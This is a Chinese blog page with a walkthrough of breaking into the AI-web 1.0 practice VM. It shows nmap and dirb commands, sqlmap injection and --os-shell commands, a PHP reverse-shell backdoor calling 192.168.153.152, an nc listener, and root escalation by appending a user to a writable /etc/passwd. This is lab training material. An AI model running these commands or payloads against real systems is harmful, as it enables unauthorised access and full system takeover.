@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="AI-web 1.0," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="AI-web 1.0靶机学习第一步、主机发现[TOC] 我们尝试使用nmap的二层发现功能进行主机扫描 nmap -sn 192.168.153.0&#x2F;24  第二步、端口扫描我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。 nmap -A -p 1-65535 192.168.153.135 -T4 我们发现靶机的80端口上运行apache服务，并且">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AI-web1.0靶机学习">
+<meta property="og:url" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="AI-web 1.0靶机学习第一步、主机发现[TOC] 我们尝试使用nmap的二层发现功能进行主机扫描 nmap -sn 192.168.153.0&#x2F;24  第二步、端口扫描我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。 nmap -A -p 1-65535 192.168.153.135 -T4 我们发现靶机的80端口上运行apache服务，并且">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185240.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185640.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185739.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185821.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190345.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190358.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190647.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190733.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190849.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215110747.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206192302.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215112454.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114220.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114406.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114646.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215115210.png">
+<meta property="article:published_time" content="2020-03-12T14:37:46.000Z">
+<meta property="article:modified_time" content="2020-04-08T07:05:39.254Z">
+<meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="AI-web 1.0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/"/>
+
+
+
+
+
+  <title>AI-web1.0靶机学习 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">AI-web1.0靶机学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T22:37:46+08:00">
+                2020-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>[TOC]</p>
+<p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
+<pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
+<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
+<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
+<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
+<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
+<pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
+<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
+<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
+<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
+<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
+<pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
+<p>继续对目标数据库中的表进行探测</p>
+<pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
+<p>探测字段</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
+<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
+<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
+<pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
+<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
+<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
+<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
+<p>依次选择4:php web server</p>
+<p>​                2:custom location</p>
+<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
+<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
+<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
+<p>我们在shell下载下a.php文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
+<p>我们在kali下监听 9966端口。</p>
+<pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
+<p>我们可以发现kali已经成功反弹shell。</p>
+<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
+<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
+<pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p>
+<pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
+<p><strong>完</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/AI-web-1-0/" rel="tag"># AI-web 1.0</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/" rel="next" title="渗透测试——被动信息收集">
+                <i class="fa fa-chevron-left"></i> 渗透测试——被动信息收集
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/12/duan-kou-shen-tou-zong-jie/" rel="prev" title="端口渗透总结">
+                端口渗透总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#AI-web-1-0靶机学习"><span class="nav-number">1.</span> <span class="nav-text">AI-web 1.0靶机学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一步、主机发现"><span class="nav-number">1.0.1.</span> <span class="nav-text">第一步、主机发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二步、端口扫描"><span class="nav-number">1.0.2.</span> <span class="nav-text">第二步、端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三步、web信息收集"><span class="nav-number">1.0.3.</span> <span class="nav-text">第三步、web信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四步、sqlmap自动化注入"><span class="nav-number">1.0.4.</span> <span class="nav-text">第四步、sqlmap自动化注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第五步、sqlmap反弹shell"><span class="nav-number">1.0.5.</span> <span class="nav-text">第五步、sqlmap反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第六步、php后门反弹shell"><span class="nav-number">1.0.6.</span> <span class="nav-text">第六步、php后门反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第七步、提权获得flag"><span class="nav-number">1.0.7.</span> <span class="nav-text">第七步、提权获得flag</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
